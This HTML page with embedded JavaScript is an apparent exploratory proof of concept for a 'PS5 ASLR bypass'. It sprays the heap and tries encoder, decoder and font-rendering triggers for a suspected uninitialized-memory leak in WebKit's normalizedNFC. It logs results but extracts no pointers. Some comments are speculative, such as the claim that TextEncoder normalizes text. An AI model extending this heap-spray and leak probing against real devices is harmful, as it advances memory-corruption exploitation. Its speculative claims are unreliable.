<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>PS5 ASLR Bypass - normalizedNFC via TextEncoding</title>
</head>
<body>
<pre id="log" style="white-space:pre-wrap; word-break:break-all; background:#111; color:#0F0; padding:10px;"></pre>
<script>
const L = s => { document.getElementById('log').textContent += s + '\n'; };

L('[*] Starting WTF::normalizedNFC leak test...');

// The bug: WTF::normalizedNFC allocates an uninitialized StringImpl
// and trusts ICU to fill it. If ICU underwrites, the tail contains heap pointers.
//
// We trigger this by encoding strings that require NFC normalization.
// TextEncoder.encodeInto() or even setting document.charset might trigger this.

// Groom heap with 0x41414141
let spray = [];
for (let i = 0; i < 100000; i++) {
    spray.push("AAAAAAAAAAAAAAAAAAAA");
}
spray = null;

// Test 1: TextEncoder with combining characters
L('\n--- Test 1: TextEncoder ---');
try {
    const encoder = new TextEncoder();
    // Strings with combining marks that require NFC normalization
    const testStrings = [
        'e\u0301', // é (NFC should compose to single char)
        'a\u0308\u0304', // ǟ
        '\u2126', // Ω (Ohm sign -> Greek Omega)
        'e\u0301'.repeat(100),
    ];
    
    for (const str of testStrings) {
        const bytes = encoder.encode(str);
        L('[+] Encoded: ' + bytes.length + ' bytes');
    }
} catch(e) {
    L('[!] TextEncoder error: ' + e.message);
}

// Test 2: TextDecoder (decoding might also trigger normalization)
L('\n--- Test 2: TextDecoder ---');
try {
    const decoder = new TextDecoder('utf-8');
    // Create bytes that represent decomposed characters
    const bytes = new Uint8Array([0x65, 0xCC, 0x81]); // e + combining acute
    const result = decoder.decode(bytes);
    L('[+] Decoded: ' + result + ' (length: ' + result.length + ')');
} catch(e) {
    L('[!] TextDecoder error: ' + e.message);
}

// Test 3: Font rendering with combining characters
// This triggers FontCascade::fontForCombiningCharacterSequence -> normalizedNFC
L('\n--- Test 3: Font Rendering ---');
try {
    const div = document.createElement('div');
    div.style.fontFamily = 'sans-serif';
    div.textContent = 'e\u0301a\u0308\u0304\u2126';
    document.body.appendChild(div);
    // Force layout
    void div.offsetWidth;
    L('[+] Font rendering triggered');
    
    // Check the rendered text
    const range = document.createRange();
    range.selectNodeContents(div);
    const text = range.toString();
    L('[+] Rendered text: ' + text);
} catch(e) {
    L('[!] Font rendering error: ' + e.message);
}

L('\n[*] Test finished.');
</script>
</body>
</html>
